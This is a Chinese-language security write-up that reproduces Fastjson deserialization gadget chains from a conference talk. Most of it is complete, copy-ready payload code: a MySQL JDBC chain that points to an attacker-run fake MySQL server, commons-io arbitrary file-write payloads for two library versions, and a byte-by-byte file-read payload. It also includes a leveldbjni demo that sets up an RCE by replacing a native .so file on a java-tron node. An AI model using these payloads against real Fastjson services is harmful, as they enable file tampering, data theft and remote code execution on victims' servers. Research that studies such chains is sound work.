**作者：Skay  
原文链接：**
## 一、Fastjson反序列化原理
这个图其实已经能让人大致理解了，更详细的分析移步
[Fastjson反序列化原理](https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/)
## 二、byPass checkAutotype
关于CheckAutoType相关安全机制简单理解移步
以及 
一句话总结checkAutoType(String typeName, Class expectClass, int features) 方法的
typeName 实现或继承自 expectClass，就会通过检验
## 三、议题中使用的Fastjson 的一些已公开Gadgets
  * 必须继承 auto closeable。
  * 必须具有默认构造函数或带符号的构造函数，否则无法正确实例化。
  * 不在黑名单中
  * 可以引起 rce 、任意文件读写或其他高风险影响
  * gadget的依赖应该在原生jdk或者广泛使用的第三方库中
Gadget自动化寻找
关于这几条链我们简单复现下
### 1.Mysql JDBC
搭配使用
    import com.alibaba.fastjson.JSON;
    public class Payload_test {
        public static void main(String[] args){
            //搭配使用 https://github.com/fnmsd/MySQL_Fake_Server
            String payload_mysqljdbc = "{\"aaa\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.lang.AutoCloseable\", \"@type\":\"\\u0063\\u006f\\u006d.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"192.168.33.128\",\"portToConnectTo\":3306,\"url\":\"jdbc:mysql://192.168.33.128:3306/test?detectCustomCollations=true&autoDeserialize=true&user=\",\"databaseToConnectTo\":\"test\",\"info\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.util.Properties\",\"PORT\":\"3306\",\"statementInterceptors\":\"\\u0063\\u006f\\u006d.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"user\":\"cb\",\"PORT.1\":\"3306\",\"HOST.1\":\"172.20.64.40\",\"NUM_HOSTS\":\"1\",\"HOST\":\"172.20.64.40\",\"DBNAME\":\"test\"}}\n" + "}";
            JSON.parse(payload_mysqljdbc);
            JSON.parseObject(payload_mysqljdbc);
        }
    }
更多版本详情参考 
### 2.commons-io写文件
#### 2.1 commons-io 2.0 - 2.6
     String aaa_8192 = "ssssssssssssss"+Some_Functions.getRandomString(8192);
    //        String write_name = "C://Windows//Temp//sss.txt";
    String write_name = "D://tmp//sss.txt";
    String payload_commons_io_filewrite_0_6 = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"encoding\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}}";
此处在Linux复现时，或者其它环境根据操作系统及进程环境不同fastjson构造函数的调用会出现随机化，在原Poc基础上修改如下即可
#### 2.1 commons-io 2.7.0 - 2.8.0
    String payload_commons_io_filewrite_7_8 = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\",\"start\":0,\"end\":2147483647},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"charsetName\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}";
### 3.commons-io 逐字节读文件内容
    String payload_read_file = "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"file:///D:/tmp/sss.txt\"},\"charsetName\": \"UTF-8\",\"bufferSize\": 1024},\"boms\": [{\"charsetName\": \"UTF-8\",\"bytes\": [11]}]},\"address\": {\"$ref\": \"$.abc.BOM\"}}";
## 四、New Gadgets 及实现区块链RCE
PPT中提到了，它没有mysql-jdbc链，且为Spring-boot，无法直接写webshell。虽然我们可以覆盖class文件，但是需要root权限，且并不确定charse.jar path。
然后回到目标本身，java tron是tron推出的公链协议的java实现，是一个开源 Java 应用程序，Java-tron 可以在 tron 节点上启用
HTTP 服务内部使用Fastjson解析Json数据。且：
  * Leveldb 和 leveldbjni：
  * 快速键值存储库
  * 被比特币使用，因此被很多公链继承
  * 存储区块链元数据，频繁轮询读写
  * 需要效率，所以 JNI 
**综上所述，洞主最终利用Fastjson的几个漏洞，结合Levaldbjni的JNI特性，替换/tmp/目录下的so文件最终执行了恶意命令**
### 1.模拟环境 Levaldbjni_Sample
这里我们简单写了一个Levaldbjni的Demo来模拟漏洞环境，
两次执行factory.open(new File("/tmp/lvltest1"), options);都将会加载
    /**
     * @auther Skay
     * @date 2021/8/10 19:35
     * @description
     */
    import static org.fusesource.leveldbjni.JniDBFactory.factory;
    import java.io.File;
    import java.io.IOException;
    import org.iq80.leveldb.DB;
    import org.iq80.leveldb.Options;
    public class Levaldbjni_Sample {
        public static void main(String[] args) throws IOException, InterruptedException {
            Options options = new Options();
            Thread.sleep(2000);
            options.createIfMissing(true);
            Thread.sleep(2000);
            DB db = factory.open(new File("/tmp/lvltest"), options);
            System.out.println("so file created");
            System.out.println("watting attack.......");
            Thread.sleep(30000);
            System.out.println("Exploit.......");
            DB db1 = factory.open(new File("/tmp/lvltest1"), options);
            try {
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    byte[] value = new String("value" + i).getBytes();
                    db.put(key, value);
                }
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    byte[] value = db.get(key);
                    String targetValue = "value" + i;
                    if (!new String(value).equals(targetValue)) {
                        System.out.println("something wrong!");
                    }
                }
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    db.delete(key);
                }
                Thread.sleep(20000);
    //            Thread.sleep(500000);
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                db.close();
            }
        }
    }
运行时会在tmp目录下生成如下文件
可以看到我们的目标就是替换libleveldbjni-64-5950274583505954902.so
### 2.commons-io 逐字节读文件名
在议题中中对于commons-io的使用是读取/tmp/目录下的随机生成的so文件名，我们现在可以使用file协议读取文件内容了，这里我们使用netdoc协议读取文件名即可，因为是逐字节读取，我们写一个简单的循环判断即可